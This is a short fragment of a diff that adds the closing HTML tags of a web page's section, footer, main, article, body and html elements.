+                    </section></footer>
+        </main>
+    </article>
+  </body>
+</html>
